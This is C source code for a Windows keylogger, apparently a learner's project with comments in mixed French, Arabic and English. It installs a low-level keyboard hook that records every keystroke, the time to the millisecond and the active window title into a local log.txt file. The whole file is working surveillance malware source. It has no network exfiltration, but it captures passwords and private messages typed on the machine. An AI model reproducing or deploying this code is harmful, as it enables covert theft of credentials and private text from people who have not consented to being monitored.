#include <stdio.h>
#include <windows.h>
#include <string.h>


HHOOK g_hook;      // idf de hook 
FILE *g_log;       // pointeur de fichers log

// Windows calls THIS function every time a key is pressed or released rahi call backfunction ncode pour verification , wparam howa type tae event  wmkeyboard w lparam adress de hook 
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
   

    if (nCode >= 0 ) {

        static BOOL ctrlHeld = FALSE, shiftHeld = FALSE;
        // on click kbd pointer ypwanti 3la lparam ywli ando access l gae info tae hook 
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*)lParam;
        UINT keyCode = kbd->vkCode;
        UINT scanCode = kbd->scanCode;


         // KEYUP → just reset the flag, log nothing
    if (wParam == WM_KEYUP) {
        if (keyCode == VK_CONTROL || keyCode == VK_LCONTROL || keyCode == VK_RCONTROL)
            ctrlHeld = FALSE;
        if (keyCode == VK_SHIFT || keyCode == VK_LSHIFT || keyCode == VK_RSHIFT)
            shiftHeld = FALSE;
        return CallNextHookEx(g_hook, nCode, wParam, lParam);
    }

    if (wParam == WM_KEYDOWN) {
        // modifier? only log if NOT already logged
        if (keyCode == VK_CONTROL || keyCode == VK_LCONTROL || keyCode == VK_RCONTROL) {
            if (!ctrlHeld) { fprintf(g_log, "[CTRL]\n"); ctrlHeld = TRUE; }
            return CallNextHookEx(g_hook, nCode, wParam, lParam);
        }
        if (keyCode == VK_SHIFT || keyCode == VK_LSHIFT || keyCode == VK_RSHIFT) {
            if (!shiftHeld) { fprintf(g_log, "[SHIFT]\n"); shiftHeld = TRUE; }
            return CallNextHookEx(g_hook, nCode, wParam, lParam);
        }


        if(wParam == WM_KEYDOWN){

             BYTE buff[256];  // array of 256 case of type byte qui contenir tout les caracter de clavier 
        PBYTE lpKeyState = buff;     // pointer for array buffer 
        GetKeyboardState(lpKeyState); // now this funcition fill the table of buffer with keyboard state via pointer 
        GetKeyboardState(lpKeyState);
                
                // FIX: GetKeyboardState can be stale inside a hook.
        // Override modifiers with the REAL current state:
        lpKeyState[VK_SHIFT]   = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) ? 0x80 : 0;
        lpKeyState[VK_LSHIFT]  = (GetAsyncKeyState(VK_LSHIFT)  & 0x8000) ? 0x80 : 0;
        lpKeyState[VK_RSHIFT]  = (GetAsyncKeyState(VK_RSHIFT)  & 0x8000) ? 0x80 : 0;
        lpKeyState[VK_CONTROL] = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 0x80 : 0;
        lpKeyState[VK_CAPITAL] = (GetAsyncKeyState(VK_CAPITAL) & 0x8000) ? 0x01 : 0;


        WCHAR pwszBuff[4];  // buffer type wchar contain the current key the output of to unicode fucntion 
        SYSTEMTIME time;
        LPSYSTEMTIME lpSystemTime = &time;
        GetLocalTime(lpSystemTime);    
        

        HWND window = GetForegroundWindow();
        WCHAR titleW[256];
        char title[256];
        static char g_lastTitle[256] = "";
        int length = GetWindowTextW(window, titleW, sizeof(titleW));
        WideCharToMultiByte(CP_UTF8, 0, titleW, -1, title, sizeof(title), NULL, NULL);

        int compResult = strcmp(g_lastTitle, title);
        if(compResult!=0){
            fprintf(g_log, " on %s\n ", title);
            strcpy(g_lastTitle, title);
        }


        int result = ToUnicode(keyCode, scanCode, lpKeyState, pwszBuff ,2 ,0); // to transfer key code to key name   
        
        

        fprintf(g_log, " %02u:%02u:%02u.%03u ",
           lpSystemTime->wHour,
           lpSystemTime->wMinute,
           lpSystemTime->wSecond,
           lpSystemTime->wMilliseconds);
        
                    
           if (result == 1 && pwszBuff[0] > 32){
                fprintf(g_log, "Key pressed: %c\n", pwszBuff[0]);  
                  // ykteb code tae character f log.txt
                 
           }
           else{
                // ToUnicode failed = not a printable character → check WHICH special key
                            switch (keyCode) {
                                case VK_RETURN:   fprintf(g_log, "[ENTER]\n");  break;
                                case VK_SPACE:    fprintf(g_log, "[SPACE]\n");    break;
                                case VK_BACK:     fprintf(g_log, "[BACKSPACE]\n");break;
                                case VK_TAB:      fprintf(g_log, "[TAB]\n");      break;
                                case VK_ESCAPE:   fprintf(g_log, "[ESC]\n");      break;
                                case VK_CAPITAL:  fprintf(g_log, "[CAPSLOCK]\n"); break;
                                case VK_LEFT:     fprintf(g_log, "[LEFT]\n");     break;
                                case VK_RIGHT:    fprintf(g_log, "[RIGHT]\n");    break;
                                case VK_UP:       fprintf(g_log, "[UP]\n");       break;
                                case VK_DOWN:     fprintf(g_log, "[DOWN]\n");     break;
                                default: {
                                            char keyName[64];
                                            // build the scancode in the format GetKeyNameText wants:
                                            UINT scan = MapVirtualKey(keyCode, MAPVK_VK_TO_VSC);
                                            LONG lParam = (scan << 16);
                                            GetKeyNameTextA(lParam, keyName, 64);
                                            fprintf(g_log, "[%s]\n", keyName);   // prints [F1], [Delete], [Alt], [Left Windows]...
                                            break;
                                        }   // ignore everything else (F1-F12, Alt, etc.)
                            }
                         

                             }
                            
                 }
            fflush(g_log); 
    return CallNextHookEx(g_hook, nCode, wParam, lParam);

        }

       
}
}
int main(){
    g_log = fopen("log.txt", "a");
    if (!g_log) { printf("Cannot open log file\n"); return 1; }
                                //hook type, function , null for executing it om our programme not externel dll
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);   //assigning this fucntion keyboardproc to windwos hook everytime hook happens windwos call this function 
    if (!g_hook) { printf("Hook failed\n"); return 1; }

    printf("Keylogger running... type something! (Close window to stop)\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {   // keeps hook alive
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    fclose(g_log);
    return 0;
}
